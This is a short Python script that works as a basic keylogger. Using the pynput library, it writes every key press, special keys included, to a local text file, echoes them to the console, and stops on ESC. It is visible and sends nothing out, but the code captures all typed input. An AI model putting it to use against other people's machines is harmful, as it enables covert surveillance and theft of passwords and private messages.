from pynput import keyboard

# File where keystrokes will be logged
LOG_FILE = "keyfile.txt"

def keyPressed(key):
    try:
        # Handle character keys
        logKey = key.char if key.char else ''
    except AttributeError:
        # Handle special keys
        special_keys = {
            keyboard.Key.space: " [SPACE] ",
            keyboard.Key.enter: " [ENTER] \n",
            keyboard.Key.backspace: " [BACKSPACE] ",
            keyboard.Key.tab: " [TAB] ",
            keyboard.Key.esc: " [ESC] - Exiting...\n",
            keyboard.Key.ctrl_l: " [CTRL] ",
        }
        logKey = special_keys.get(key, f" [{key}] ")

    # Save key logs to file
    with open(LOG_FILE, 'a') as logFile:
        logFile.write(logKey)

    # Print for debugging
    print(logKey, end='', flush=True)

    # **Exit when ESC is pressed**
    if key == keyboard.Key.esc:
        print("\n🔴 Keylogger Stopped.")
        return False  # This stops the listener

if __name__ == "__main__":
    print("🔹 Keylogger Started... (Press ESC to exit)")
    
    # Start listener in **blocking mode** so it stops properly
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()  # This makes sure it runs continuously
